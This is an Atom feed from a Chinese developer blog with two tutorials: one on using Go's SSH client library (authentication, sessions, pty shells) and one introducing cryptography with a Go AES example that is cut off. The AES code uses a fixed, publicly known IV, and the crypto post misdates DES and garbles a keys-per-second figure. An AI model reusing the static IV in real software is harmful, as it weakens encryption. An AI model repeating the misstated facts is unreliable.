<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>紫川秀的博客</title>
  <subtitle>比你优秀的人不可怕,可怕的是比你优秀的人比你更努力。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.yumaojun.net/"/>
  <updated>2017-02-22T16:10:41.000Z</updated>
  <id>https://blog.yumaojun.net/</id>
  
  <author>
    <name>紫川秀</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>跳板机系列(三)-SSH在Golang中的使用</title>
    <link href="https://blog.yumaojun.net/2017/02/22/ssh-protocol-go/"/>
    <id>https://blog.yumaojun.net/2017/02/22/ssh-protocol-go/</id>
    <published>2017-02-22T15:39:54.000Z</published>
    <updated>2017-02-22T16:10:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>上面几篇博客已经介绍过加密算法和ssh协议的构成, 这篇博客主要将介绍golang中ssh库的一些具体使用,为后面写ssh的跳板机做铺垫。<br><a id="more"></a></p>
<h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><p>先上2个栗子, 后面会对此做详细介绍<br>Shell交互模式<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"> <span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"log"</span></div><div class="line">	<span class="string">"os"</span></div><div class="line"></div><div class="line">	<span class="string">"golang.org/x/crypto/ssh"</span></div><div class="line">	<span class="string">"golang.org/x/crypto/ssh/terminal"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	ce := <span class="function"><span class="keyword">func</span><span class="params">(err error, msg <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">			log.Fatalf(<span class="string">"%s error: %v"</span>, msg, err)</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	client, err := ssh.Dial(<span class="string">"tcp"</span>, <span class="string">"localhost:1234"</span>, &amp;ssh.ClientConfig&#123;</div><div class="line">		User: <span class="string">"root"</span>,</div><div class="line">		Auth: []ssh.AuthMethod&#123;ssh.Password(<span class="string">"xxx"</span>)&#125;,</div><div class="line">	&#125;)</div><div class="line">	ce(err, <span class="string">"dial"</span>)</div><div class="line"></div><div class="line">	session, err := client.NewSession()</div><div class="line">	ce(err, <span class="string">"new session"</span>)</div><div class="line">	<span class="keyword">defer</span> session.Close()</div><div class="line"></div><div class="line">	session.Stdout = os.Stdout</div><div class="line">	session.Stderr = os.Stderr</div><div class="line">	session.Stdin = os.Stdin</div><div class="line"></div><div class="line">	modes := ssh.TerminalModes&#123;</div><div class="line">		ssh.ECHO:          <span class="number">1</span>,</div><div class="line">		ssh.ECHOCTL:       <span class="number">0</span>,</div><div class="line">		ssh.TTY_OP_ISPEED: <span class="number">14400</span>,</div><div class="line">		ssh.TTY_OP_OSPEED: <span class="number">14400</span>,</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	termFD := <span class="keyword">int</span>(os.Stdin.Fd())</div><div class="line">	w, h, _ := terminal.GetSize(termFD)</div><div class="line">	termState, _ := terminal.MakeRaw(termFD)</div><div class="line">	<span class="keyword">defer</span> terminal.Restore(termFD, termState)</div><div class="line"></div><div class="line">	err = session.RequestPty(<span class="string">"xterm-256color"</span>, h, w, modes)</div><div class="line">	ce(err, <span class="string">"request pty"</span>)</div><div class="line"></div><div class="line">	err = session.Shell()</div><div class="line">	ce(err, <span class="string">"start shell"</span>)</div><div class="line"></div><div class="line">	err = session.Wait()</div><div class="line">	ce(err, <span class="string">"return"</span>)</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>远程命令模式<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"bytes"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line"></div><div class="line">	<span class="string">"golang.org/x/crypto/ssh"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	ce := <span class="function"><span class="keyword">func</span><span class="params">(err error, msg <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">			log.Fatalf(<span class="string">"%s error: %v"</span>, msg, err)</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	client, err := ssh.Dial(<span class="string">"tcp"</span>, <span class="string">"localhost:1234"</span>, &amp;ssh.ClientConfig&#123;</div><div class="line">		User: <span class="string">"root"</span>,</div><div class="line">		Auth: []ssh.AuthMethod&#123;ssh.Password(<span class="string">"xxx"</span>)&#125;,</div><div class="line">	&#125;)</div><div class="line">	ce(err, <span class="string">"dial"</span>)</div><div class="line"></div><div class="line">	session, err := client.NewSession()</div><div class="line">	ce(err, <span class="string">"new session"</span>)</div><div class="line">	<span class="keyword">defer</span> session.Close()</div><div class="line"></div><div class="line">	modes := ssh.TerminalModes&#123;</div><div class="line">		ssh.ECHO:          <span class="number">1</span>,</div><div class="line">		ssh.ECHOCTL:       <span class="number">0</span>,</div><div class="line">		ssh.TTY_OP_ISPEED: <span class="number">14400</span>,</div><div class="line">		ssh.TTY_OP_OSPEED: <span class="number">14400</span>,</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	err = session.RequestPty(<span class="string">"xterm-256color"</span>, <span class="number">80</span>, <span class="number">40</span>, modes)</div><div class="line">	ce(err, <span class="string">"request pty"</span>)</div><div class="line"></div><div class="line">	<span class="keyword">if</span> err := session.Setenv(<span class="string">"LC_USR_DIR"</span>, <span class="string">"/usr"</span>); err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="built_in">panic</span>(<span class="string">"Failed to run: "</span> + err.Error())</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">var</span> b bytes.Buffer</div><div class="line">	session.Stdout, session.Stderr = &amp;b, &amp;b</div><div class="line">	<span class="keyword">if</span> err := session.Run(<span class="string">"ls -l $LC_USR_DIR"</span>); err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="built_in">panic</span>(<span class="string">"Failed to run: "</span> + err.Error())</div><div class="line">	&#125;</div><div class="line">	fmt.Println(b.String())</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SSH(Secure Shell)是一个提供数据通信安全、远程登录、远程指令执行等功能的安全网络协议, 具体可以查阅我的上一篇博客<a href="/2017/02/16/ssh-protocol/" title="跳板机系列(二)-ssh协议原理简介">跳板机系列(二)-ssh协议原理简介</a><br>但是golang的ssh包并不在golang的标准库中, 在: godoc.org/golang.org/x/crypto/ssh中, 所以需要翻墙才能下到。<br>golang的这个ssh包同时实现了ssh的客户端和server端, 也许你也经常看到一个ssh-agent的东西, 也在这个包括, 但我不将他归纳在client和server里面, 因为ssh-agent是一个用于保存私钥的程序, 在数字签名验证时(RSA, DSA, ECDSA, Ed25519)提供身份认证, 它就是一个帮助我们验证身份的程序。<br>接下来主要讲ssh clent, 但是还是会涉及到一点ssh-agent的部分。</p>
<h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><p>要使用ssh的客户端, 那么认证就比较关键了, ssh提供2种认证方式: 用户名密码认证和密钥认证。<br>通过ssh提供的一个config对象, 我们可以配置ssh使用的认证方式. 而配置对象里面关于认证的配置使用的是ssh.AuthMethod接口, ssh.AuthMethod是auth的总接口(存储实现了auth 和 method的对象), AuthMethod呈现的是一个实现了RFC4252认证方法的实例。</p>
<h3 id="用户名密码认证"><a href="#用户名密码认证" class="headerlink" title="用户名密码认证"></a>用户名密码认证</h3><p>认证方式如果使用Password方式的话  那么可以使用ssh.Password方法获取一个AuthMethod接口对象。<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sshConfig := &amp;ssh.ClientConfig&#123;</div><div class="line">	User: <span class="string">"your_user_name"</span>,</div><div class="line">	Auth: []ssh.AuthMethod&#123;</div><div class="line">		ssh.Password(<span class="string">"your_password"</span>)</div><div class="line">	&#125;,</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="密钥认证"><a href="#密钥认证" class="headerlink" title="密钥认证"></a>密钥认证</h3><p>前提: 密钥认证的本质是使用非对称加密的数字签名功能, 所以必须将你的公共密钥填充到一个远程机器上的authorized_keys文件中 你可以手动完成, 也可以使用ssh-copy-id这个命令来帮你完成。<br>在公钥推送ok过后, 使用秘钥认证, 这里有两种方式可以获取用户的私钥, 用于签名算法时做身份认证: 从秘钥文件中读取和ssh-agent中读取。</p>
<h4 id="私钥文件"><a href="#私钥文件" class="headerlink" title="私钥文件"></a>私钥文件</h4><p>读取私钥文件, 然后使用ssh.PublicKeys方法 获取一个AuthMethod接口对象, 这里我再次封装了下, 通过PublicKeyFile可以直接获取一个公钥的AuthMethod接口。<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">PublicKeyFile</span><span class="params">(file <span class="keyword">string</span>)</span> <span class="title">ssh</span>.<span class="title">AuthMethod</span></span> &#123;</div><div class="line">	buffer, err := ioutil.ReadFile(file)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	key, err := ssh.ParsePrivateKey(buffer)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ssh.PublicKeys(key)</div><div class="line">&#125;</div><div class="line"></div><div class="line">sshConfig := &amp;ssh.ClientConfig&#123;</div><div class="line">	User: <span class="string">"your_user_name"</span>,</div><div class="line">	Auth: []ssh.AuthMethod&#123;</div><div class="line">		PublicKeyFile(<span class="string">"/path/to/your/pub/certificate/key"</span>)	</div><div class="line">	&#125;,</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="SSH-Agent"><a href="#SSH-Agent" class="headerlink" title="SSH Agent"></a>SSH Agent</h4><p>SSH Agent 是一个*nix系统里面的工具, 他将用户私钥保存在一张加密的表中, 为了避免命令行的参数传入, 很多用户还是愿意将他们的秘钥交给ssh agent管理。<br>为了能获取到你存储在ssh agent中的私钥, 你首先的将你的私钥提交给ssh agent保管,执行如下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh-add /path/to/your/private/certificate/file</div></pre></td></tr></table></figure></p>
<p>我们可以通过socket(net.Dial)访问到里面存储的私钥, 然后使用工厂函数ssh.PublicKeysCallback来创建一个ssh agent的AuthMethod实例。<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">SSHAgent</span><span class="params">()</span> <span class="title">ssh</span>.<span class="title">AuthMethod</span></span> &#123;</div><div class="line">	<span class="keyword">if</span> sshAgent, err := net.Dial(<span class="string">"unix"</span>, os.Getenv(<span class="string">"SSH_AUTH_SOCK"</span>)); err == <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> ssh.PublicKeysCallback(agent.NewClient(sshAgent).Signers)</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="literal">nil</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">sshConfig := &amp;ssh.ClientConfig&#123;</div><div class="line">	User: <span class="string">"your_user_name"</span>,</div><div class="line">	Auth: []ssh.AuthMethod&#123;</div><div class="line">		SSHAgent()</div><div class="line">	&#125;,</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="建立链接"><a href="#建立链接" class="headerlink" title="建立链接"></a>建立链接</h2><p>当我们通过ssh.ClientConfig对象设置好ssh的配置过后, 我们就可以调用ssh.Dial方法来建立一个ssh连接了<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">connection, err := ssh.Dial(<span class="string">"tcp"</span>, <span class="string">"host:port"</span>, sshConfig)</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"Failed to dial: %s"</span>, err)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="创建回话与交换"><a href="#创建回话与交换" class="headerlink" title="创建回话与交换"></a>创建回话与交换</h2><p>当ssh连接建立过后, 我们就可以通过这个连接建立一个回话, 在回话上和远程主机通信。<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">session, err := connection.NewSession()</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"Failed to create session: %s"</span>, err)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>但是通信之前我们需要请求在远程主机上创建一个伪终端(pty全称pseudo terminal), 简单说来pty是一对字符设备, 提供一个双向沟通的渠道，大概过程是这样(pty master &lt;—session—&gt; pty slave), 关于对pty的更详尽的介绍可以参考<a href="http://ytliu.info/blog/2013/09/28/ttyde-na-xie-shi-er/" target="_blank" rel="external">TTY的那些事儿</a><br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">modes := ssh.TerminalModes&#123;</div><div class="line">	ssh.ECHO:          <span class="number">0</span>,     <span class="comment">// disable echoing</span></div><div class="line">	ssh.TTY_OP_ISPEED: <span class="number">14400</span>, <span class="comment">// input speed = 14.4kbaud</span></div><div class="line">	ssh.TTY_OP_OSPEED: <span class="number">14400</span>, <span class="comment">// output speed = 14.4kbaud</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> err := session.RequestPty(<span class="string">"xterm"</span>, <span class="number">80</span>, <span class="number">40</span>, modes); err != <span class="literal">nil</span> &#123;</div><div class="line">	session.Close()</div><div class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"request for pseudo terminal failed: %s"</span>, err)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>远程主机开启pty终端过后, 我们就可以直接通过Run发送命令了, 这里我们通过Setenv设置session的环境变量, session执行的结果通过Stdout, Stderr返回, 这里使用一个Buffer来保存这些结果。<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> err := session.Setenv(<span class="string">"LC_USR_DIR"</span>, <span class="string">"/usr"</span>); err != <span class="literal">nil</span> &#123;</div><div class="line">	<span class="built_in">panic</span>(<span class="string">"Failed to run: "</span> + err.Error())</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> b bytes.Buffer</div><div class="line">session.Stdout, session.Stderr = &amp;b, &amp;b</div><div class="line"><span class="keyword">if</span> err := session.Run(<span class="string">"ls -l $LC_USR_DIR"</span>); err != <span class="literal">nil</span> &#123;</div><div class="line">	<span class="built_in">panic</span>(<span class="string">"Failed to run: "</span> + err.Error())</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>如果我们使用Shell模式的话, 我们需要在ptmx上创建一个terminal, 这样对他的操作才会反应到pts上 ,大概的原理是这样: <code>ssh&lt;---&gt;/dev/ptmx(master)&lt;---&gt;pts/*(slave)&lt;---&gt;getty</code><br>为了说清楚原理, 我引用了别人的话,希望能方便你理解:</p>
<blockquote>
<p>如果某人在网上使用telnet程序连接到你的计算机上，则telnet程序就可能会打开/dev/ptmx设备获取一个fd。此时一个getty程序就应该运行在对应的/dev/pts/<em>上。当telnet从远端获取了一个字符时，该字符就会通过ptmx、pts/</em>传递给 getty程序，而getty程序就会通过pts/*、ptmx和telnet程序往网络上返回“login:”字符串信息。这样，登录程序与telnet程序就通过伪终端进行通信。</p>
</blockquote>
<figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">session.Stdout = os.Stdout</div><div class="line">session.Stderr = os.Stderr</div><div class="line">session.Stdin = os.Stdin</div><div class="line"></div><div class="line">modes := ssh.TerminalModes&#123;</div><div class="line">	ssh.ECHO:          <span class="number">1</span>,</div><div class="line">	ssh.ECHOCTL:       <span class="number">0</span>,</div><div class="line">	ssh.TTY_OP_ISPEED: <span class="number">14400</span>,</div><div class="line">	ssh.TTY_OP_OSPEED: <span class="number">14400</span>,</div><div class="line">&#125;</div><div class="line"></div><div class="line">termFD := <span class="keyword">int</span>(os.Stdin.Fd())</div><div class="line">w, h, _ := terminal.GetSize(termFD)</div><div class="line">termState, _ := terminal.MakeRaw(termFD)</div><div class="line"><span class="keyword">defer</span> terminal.Restore(termFD, termState)</div><div class="line"></div><div class="line">err = session.RequestPty(<span class="string">"xterm-256color"</span>, h, w, modes)</div><div class="line">ce(err, <span class="string">"request pty"</span>)</div></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实TTY是一个很大很经典的话题, 后面做Web Terminal时, 还得使用xterm这种类型的pty, 由于篇幅有限, 没有展开, 以后补上。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上面几篇博客已经介绍过加密算法和ssh协议的构成, 这篇博客主要将介绍golang中ssh库的一些具体使用,为后面写ssh的跳板机做铺垫。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Golang" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Golang/"/>
    
    
      <category term="ssh-jumphost" scheme="https://blog.yumaojun.net/tags/ssh-jumphost/"/>
    
  </entry>
  
  <entry>
    <title>密码学简介与Golang的加密库Crypto的使用</title>
    <link href="https://blog.yumaojun.net/2017/02/19/go-crypto/"/>
    <id>https://blog.yumaojun.net/2017/02/19/go-crypto/</id>
    <published>2017-02-19T15:07:51.000Z</published>
    <updated>2017-02-22T15:24:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>据记载，公元前400年，古希腊人发明了置换密码。1881年世界上的第一个电话保密专利出现。在第二次世界大战期间，德国军方启用“恩尼格玛”密码机，密码学在战争中起着非常重要的作用, 这段历史很有趣,建议看看<a href="https://www.zhihu.com/question/28397034" target="_blank" rel="external">恩格玛机破解历史</a>。<br>随着信息化和数字化社会的发展，人们对信息安全和保密的重要性认识不断提高，于是在1997年，美国国家标准局公布实施了“美国数据加密标准（DES）”，民间力量开始全面介入密码学的研究和应用中，采用的加密算法有DES、RSA、SHA等。随着对加密强度需求的不断提高，近期又出现了AES、ECC等。<br><a id="more"></a></p>
<h2 id="密码学的目的"><a href="#密码学的目的" class="headerlink" title="密码学的目的"></a>密码学的目的</h2><ul>
<li>保密性：防止用户的标识或数据被读取。</li>
<li>数据完整性：防止数据被更改。</li>
<li>身份验证：确保数据发自特定的一方。</li>
</ul>
<h2 id="密码学的应用"><a href="#密码学的应用" class="headerlink" title="密码学的应用"></a>密码学的应用</h2><p>随着密码学商业应用的普及，公钥密码学受到前所未有的重视。除传统的密码应用系统外，PKI系统以公钥密码技术为主，提供加密、签名、认证、密钥管理、分配等功能。</p>
<ul>
<li>保密通信：保密通信是密码学产生的动因。使用公私钥密码体制进行保密通信时，信息接收者只有知道对应的密钥才可以解密该信息。</li>
<li>数字签名：数字签名技术可以代替传统的手写签名，而且从安全的角度考虑，数字签名具有很好的防伪造功能。在政府机关、军事领域、商业领域有广泛的应用环境。</li>
<li>秘密共享：秘密共享技术是指将一个秘密信息利用密码技术分拆成n个称为共享因子的信息，分发给n个成员，只有k(k≤n)个合法成员的共享因子才可以恢复该秘密信息，其中任何一个或m(m≤k)个成员合作都不知道该秘密信息。利用秘密共享技术可以控制任何需要多个人共同控制的秘密信息、命令等。</li>
<li>认证功能：在公开的信道上进行敏感信息的传输，采用签名技术实现对消息的真实性、完整性进行验证，通过验证公钥证书实现对通信主体的身份验证。</li>
<li>密钥管理：密钥是保密系统中更为脆弱而重要的环节，公钥密码体制是解决密钥管理工作的有力工具；利用公钥密码体制进行密钥协商和产生，保密通信双方不需要事先共享秘密信息；利用公钥密码体制进行密钥分发、保护、密钥托管、密钥恢复等。</li>
</ul>
<h2 id="加密算法介绍"><a href="#加密算法介绍" class="headerlink" title="加密算法介绍"></a>加密算法介绍</h2><p>根据密钥类型不同将现代密码技术分为两类：</p>
<ul>
<li>对称加密算法: 加密和解密均采用同一把秘密钥匙。</li>
<li>非对称加密算法: 有2把密钥,公钥和私钥, 公钥加密, 私钥解密。</li>
</ul>
<h3 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h3><p>对称加密算法用来对敏感数据等信息进行加密，常用的算法包括：</p>
<ul>
<li>DES(Data Encryption Standard): 数据加密标准，速度较快，适用于加密大量数据的场合。</li>
<li>3DES(Triple DES): 是基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高。</li>
<li>AES(Advanced Encryption Standard): 高级加密标准，是下一代的加密算法标准，速度快，安全级别高；</li>
</ul>
<h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><p>2000年10月，NIST(美国国家标准和技术协会)宣布通过从15种侯选算法中选出的一项新的密匙加密标准。Rijndael被选中成为将来的AES。 Rijndael是在1999年下半年，由研究员Joan Daemen和Vincent Rijmen创建的。AES正日益成为加密各种形式的电子数据的实际标准。<br>并于2002年5月26日制定了新的高级加密标准 (AES) 规范。<br>算法原理</p>
<blockquote>
<p>AES算法基于排列和置换运算。排列是对数据重新进行安排，置换是将一个数据单元替换为另一个。AES 使用几种不同的方法来执行排列和置换运算。<br>AES是一个迭代的、对称密钥分组的密码，它可以使用128、192 和 256 位密钥，并且用 128 位（16字节）分组加密和解密数据。与公共密钥密码使用密钥对不同，对称密钥密码使用相同的密钥加密和解密数据。通过分组密码返回的加密数据的位数与输入数据相同。迭代加密使用一个循环结构，在该循环中重复置换和替换输入数据。</p>
</blockquote>
<h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p>DES全称为Data Encryption Standard，即数据加密标准，是一种使用密钥加密的块算法，1977年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），并授权在非密级政府通信中使用，随后该算法在国际上广泛流传开来。</p>
<h4 id="AES与3DES的比较"><a href="#AES与3DES的比较" class="headerlink" title="AES与3DES的比较"></a>AES与3DES的比较</h4><table>
<thead>
<tr>
<th>算法名称</th>
<th style="text-align:center">算法类型</th>
<th style="text-align:center">密钥长度</th>
<th style="text-align:center">速度</th>
<th style="text-align:center">解密时间（建设机器每秒尝试255个密钥）</th>
<th style="text-align:right">资源消耗</th>
</tr>
</thead>
<tbody>
<tr>
<td>AES</td>
<td style="text-align:center">对称block密码</td>
<td style="text-align:center">128、192、256位</td>
<td style="text-align:center">高</td>
<td style="text-align:center">1490000亿年</td>
<td style="text-align:right">低</td>
</tr>
<tr>
<td>3DES</td>
<td style="text-align:center">对称feistel密码</td>
<td style="text-align:center">112位或168位</td>
<td style="text-align:center">低</td>
<td style="text-align:center">46亿年</td>
<td style="text-align:right">中</td>
</tr>
</tbody>
</table>
<h4 id="破解历史"><a href="#破解历史" class="headerlink" title="破解历史"></a>破解历史</h4><p>历史上有三次对DES有影响的攻击实验。1997年，利用当时各国 7万台计算机，历时96天破解了DES的密钥。1998年，电子边境基金会（EFF）用25万美元制造的专用计算机，用56小时破解了DES的密钥。1999年，EFF用22小时15分完成了破解工作。因此。曾经有过卓越贡献的DES也不能满足我们日益增长的需求了。</p>
<h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><p>综上看来AES安全度最高, 基本现状就是AES已经替代DES成为新一代对称加密的标准, 下面是Golang中AES使用的栗子<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"crypto/aes"</span></div><div class="line">	<span class="string">"crypto/cipher"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="keyword">var</span> commonIV = []<span class="keyword">byte</span>&#123;<span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span 